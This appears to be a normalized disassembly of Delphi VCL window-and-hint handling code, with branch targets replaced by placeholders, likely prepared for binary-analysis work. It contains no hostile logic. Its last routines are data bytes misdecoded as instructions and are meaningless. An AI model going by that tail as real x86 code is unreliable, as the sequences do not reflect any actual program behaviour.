jne r-xdata
mov eax edi
call sub_442568
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_4426d0
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_45c098
test al al
je r-xdata
call sub_4423cc
mov ebp eax
mov eax edi
call sub_4423cc
mov ebp eax
mov eax esi
call sub_45c098
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_45bb5c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45bbb4
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_45c098
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45c8e4
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bbbb
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_45bbc4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push j_sub_403960#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_45c098
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45c8e4
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bc23
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_45bc34
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403224
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_43bd6c
jmp r-xdata
sub_45bc84
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_459230
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_4423cc
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45921c
mov ebx eax
mov eax ebx
call sub_4426d0
test al al
je r-xdata
mov eax ebx
call sub_4423cc
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_45bce8
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43a478
mov edi eax
call sub_438d74
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_43cd98
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_43cd98
sub_45bd60
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45be70
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45bce8
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_459d98
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_438d30
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_45bf20
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_4036ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_45c2b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45bc84
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_419250
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45be77
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f80
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_45be80
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_459214
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_459200
movzx edx di
xor ecx ecx
call sub_43cd98
inc esi
dec ebx
jne r-xdata
sub_45bebc
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_45afd8
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45afd8
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_45be80
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_45bf20
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_404368
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403fb0
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_435978
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_448668
xor eax eax
push ebp
push j_sub_403960#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403420
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403224
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_45bfb4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_45c010
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_459214
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_45bfb4
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_459200
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_45bfb4
pop ecx
jmp r-xdata
mov eax ebx
call sub_4426d0
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_4423cc
push eax
call IsChild
test eax eax
jne r-xdata
sub_45c098
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405598
call sub_422f18
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_45c0c0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_45c104
push sub_459df0
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_45c2b8
sub_45c12c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406878
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43b6e4
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_43a478
call sub_459dd0
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_45c2b8
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406878
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43b6e4
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_45c2b8
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_45c0c0
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_43cd98
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_45c550
jmp r-xdata
sub_45c23c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_45c104
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_45c550
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_45c274
jmp r-xdata
sub_45c274
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4426d0
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4423cc
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_4423cc
push eax
call ShowWindow
sub_45c2b8
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_45c274
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_459f58
mov eax ebx
call sub_45c104
sub_45c2f0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push j_sub_403960#4
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_41e7ac
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_4079c0
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_45c403
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_41e864
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c40a
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_45c2e0
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_45c2e0
mov [ ebp - 0x4 ] eax
sub_45c40a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_45c444
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403224
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_40316c
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45c4a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push j_sub_403960#3
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c545
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_40404c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41d390
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40bfd4
mov ebx eax
inc ebx
sub_45c550
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4048c8
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_45c8d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45c2b8
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_45c0c0
jmp r-xdata
call sub_452780
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c8dd
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403f80
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_40498c
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_43a478
call sub_459dd0
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_45c2f0
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_459194
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43b56c
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43b710
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_459d98
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_438cec
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_403ff4
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_43cd98
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_45c444
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403420
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43b6e4
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43b6e4
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_43bd6c
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_459ee4
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_45c4a4
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_45c0c0
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_45c0c0
jmp r-xdata
sub_45c8e4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403fb0
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403fb0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45c920
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_43cd98
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_43cd98
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_448530
sub_45c9b0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_45c9d8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_45ca7c
add [ eax ] eax
add [ eax ] al
inc esp
cmp eax 0x848c0046
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push j_sub_403960#2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cae6
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_45252c
mov eax sub_4527ac
call sub_41344c
mov eax [ rw-data ]
push eax
call CloseHandle
sub_45cb30
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ebp cs
inc ebp
add [ esp + ecx * 8 + 0x45 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x33 ] cl
inc ebp
add [ eax ] dh
add eax [ eax ]
add [ eax + 0x13 ] al
inc ebp
add [ eax - 0x65 ] ah
inc ecx
add [ eax + 0x3f ] ch
inc ebp
add [ ecx + eax * 2 ] bl
inc ebp
add [ eax + 0x34 ] ch
inc eax
add [ eax - 0x43ffba9b ] cl
xor [ eax ] eax
fdiv [ ecx ]
inc eax
add [ ecx + eax * 2 + 0x2ee40045 ] al
inc esp
add ah dh
inc esi
inc ebp
add [ esi + edi + 0x43440041 ] bh
inc ebp
add [ eax - 0x73ffbabd ] al
inc esp
inc ebp
add [ ecx + edi * 4 - 0x6487ffbd ] dh
inc ecx
add [ ecx * 2 - 0x67a7ffbb ] al
inc ecx
add [ eax + ecx * 4 + 0x3ddc0045 ] ah
inc ebp
add al bh
sub [ eax + eax + 0x14 ] eax
das
inc esp
add [ eax + 0x2e ] ah
inc esp
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ esp + 0x44 ] dh
add ah ah
dec ecx
inc ebp
add [ ecx - 0x51a7ffbc ] ch
inc ebx
add [ esi + ebp * 4 + 0x43 ] bl
add al bl
dec edx
inc ebp
add [ esi + ebx * 8 - 0x4663ffbd ] bl
inc ebx
add ah dl
scasd [ edi ]
inc ebx
add [ eax ] ch
mov ebx 0x4ccc0043
inc ebp
add [ eax + 0x6000454b ] bl
mov esp 0x4d440043
inc ebp
add [ eax ] ah
fild [ ebx ]
add [ edx ] ah
inc esp
